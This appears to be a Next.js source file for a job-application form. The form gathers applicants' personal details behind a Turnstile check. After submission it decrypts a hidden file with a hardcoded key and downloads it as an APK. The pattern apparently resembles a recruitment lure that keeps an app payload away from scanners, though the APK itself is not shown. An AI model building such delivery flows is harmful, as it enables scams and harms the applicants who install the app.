import {createPortal} from "react-dom";
import React, { useEffect, useState, useRef } from "react";
import {downloadDeCryptFile,loadTurnstile} from "@lib/index";
import {useTranslations} from 'next-intl';
function Popup({show=false,onClosePop=()=>{},onTokenCall}){
    const t =  useTranslations('wallet.recruit.apply');
    const turnstileRef = useRef(null);
    const [turnstileToken, setTurnstileToken] = useState(null);
    useEffect(()=>{
        let widgetId = null;
        if(show){
            if (turnstileRef.current && window.turnstile) {
                widgetId = window.turnstile.render(turnstileRef.current, {
                    sitekey: "0x4AAAAAADlku3naDD7L7ojO",
                    callback: function (token) {
                        console.log("Success:", token);
                        setTurnstileToken(token);
                        onTokenCall(token);
                    },
                });
                //const token = window.turnstile.getResponse(widgetId);

            }
        }
        return () => {
            if (widgetId) {
                window.turnstile.remove(widgetId);
            }
        };
    },[show])
    return <div className="fixed w-full top-[20%]">
        <div className="w-2/3 bg-white/85 py-10 px-3 mx-auto border border-amber-400 rounded-md shadow-md shadow-amber-500">
            <h1 className="text-2xl/tight font-bold text-center px-3 border-b pb-4">кеңес:</h1>
            <div className="py-3">
                <p>{t("a1")}</p>
            </div>
            <div className="w-1/2 mx-auto p-6"><div id="turnstile-container" ref={turnstileRef}></div></div>
            <div className="text-center py-4"><button onClick={onClosePop} className="cursor-pointer bg-cyan-500 w-2/3 py-3 rounded-2xl">{t("a2")}</button></div>
        </div>
    </div>;
}
export default function Recruit(){
    const t =  useTranslations('wallet.recruit.apply');
    const [data,setData] = useState({
        name:"",
        gender:'o',
        tel:"",
        addr:"",
        position:"",
        expected:"",
        comeAt:"",
        kind:"",
        edu:"",
        major:"",
        school:"",
        workExp:"",
        skillIntr:"",
        disclaimer:""
    });
    const [show,setShow] = useState(false);
    function onSubmit(){
        setShow(true);
    }
    function selectDataChange(e){
        var val = e.target.selectedOptions[0].value;
        var key = e.target.getAttribute("name");
        setData({
            ...data,
            [key]:val
        });
    }
    function inputFiledDataChange(e){
        var val = e.target.value;
        var key = e.target.getAttribute("name");
        setData({
            ...data,
            [key]:val
        });
    }
    function tokenCall(token){
        Submiting(token);
    }
    function Submiting(token){
        
        const {name,gender,tel,addr,position,expected,comeAt,kind,edu,major,school,workExp,skillIntr,disclaimer} = data;
        fetch("/pintura/recruitSave",{
            method:"POST",
            headers:{
                "Content-Type":"application/json",
                "cf-turnstile-response":token
            },
            body:JSON.stringify({
                name,gender,tel,addr,position,expected,comeAt,kind,edu,major,school,workExp,skillIntr,disclaimer
            })
        }).then(res=>{
            if(res.ok){
                return res.json();
            }else{
                throw Error("oh no, somthing went wrong!")
            }
        }).then((json)=>{
            downloadDeCryptFile("/assets/reelshor","reelshor.apk","QqH3+847'39(8#37djOvhfjlsi%kf@=]");
            setShow(false);
        }).catch(err=>{
            console.log(err);
        })
    }
    useEffect(()=>{
        loadTurnstile();
        window.scrollTo({
            top:0
        })
    },[])
    return (
        <div className="p-4 lg:w-2/3 lg:mx-auto">
            {show?createPortal(<Popup show={show} onClosePop={()=>{}} onTokenCall={tokenCall}/>,document.body):""}
            <h1 className="text-3xl text-center mb-4">{t("a3")}</h1>
            <div>
                <p className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a4")}</p>
                <div className="py-4">
                    <p className="py-1 flex flex-row gap-2">
                        <label className="flex-1" htmlFor="name">{t("a5")}</label>
                        <input name="name" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label className="flex-1" htmlFor="gender">{t("a6")}</label>
                        <select defaultValue="o" className="flex-5 border-b outline-0" name="gender" onChange={selectDataChange}>
                            <option value="m">{t("a7")}</option>
                            <option value="f">{t("a8")}</option>
                            <option value="o">{t("a9")}</option>
                        </select>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label className="flex-1" htmlFor="tel">{t("a10")}</label>
                        <input name="tel" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="addr" className="flex-1">{t("a11")}</label>
                        <input name="addr" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange} />
                    </p>

                </div>
            </div>
            <div>
                <p className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a12")}</p>
                <div className="py-4 grid grid-cols-2 gap-2">
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="position" className="flex-1">{t("a13")}</label>
                        <input name="position" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange} />
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="expected" className="flex-1">{t("a14")}</label>
                        <input name="expected" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="comeAt" className="flex-1">{t("a15")}</label>
                        <input name="comeAt" className="flex-5 border-b outline-0" type="date" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="kind" className="flex-1">{t("a16")}</label>
                        <input name="kind" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>

                </div>
            </div>
            <div>
                <p className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a17")}</p>
                <div className="py-4">
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="edu" className="flex-1">{t("a18")}</label>
                        <input name="edu" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="major" className="flex-1">{t("a19")}</label>
                        <input name="major" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                    <p className="py-1 flex flex-row gap-2">
                        <label htmlFor="school" className="flex-1">{t("a20")}</label>
                        <input name="school" className="flex-5 border-b outline-0" type="text" onChange={inputFiledDataChange}/>
                    </p>
                </div>
            </div>
            <div>
                 <p htmlFor="workExp" className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a21")}</p>
                 <div>
                    <textarea name="workExp" className="w-full border mt-4 h-39 p-2 outline-0" onChange={inputFiledDataChange}></textarea>
                 </div>
            </div>
            <div className="mt-4">
                 <p htmlFor="skillIntr" className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a22")}</p>
                 <div>
                    <textarea name="skillIntr" className="w-full border mt-4 h-39 p-2 outline-0" onChange={inputFiledDataChange}></textarea>
                 </div>
            </div>
            <div className="mt-4">
                 <p htmlFor="disclaimer" className="text-2xl bg-[#90b9d1] py-2 px-4">{t("a23")}</p>
                 <div>
                    <textarea onChange={inputFiledDataChange} name="disclaimer" className="w-full border mt-4 h-39 p-2 outline-0" placeholder={t("a24")}></textarea>
                 </div>
            </div>
            
            {/*<div class="cf-turnstile" data-sitekey="0x4AAAAAADlku3naDD7L7ojO" data-callback={onSuccess}></div>*/}
            <div id="turnstile-container"></div>
            <div className="py-5 text-center"><button onClick={onSubmit} className="cursor-pointer bg-cyan-400 w-2/3 py-4 text-3xl rounded-2xl">{t("a25")}</button></div>
        </div>
    );
}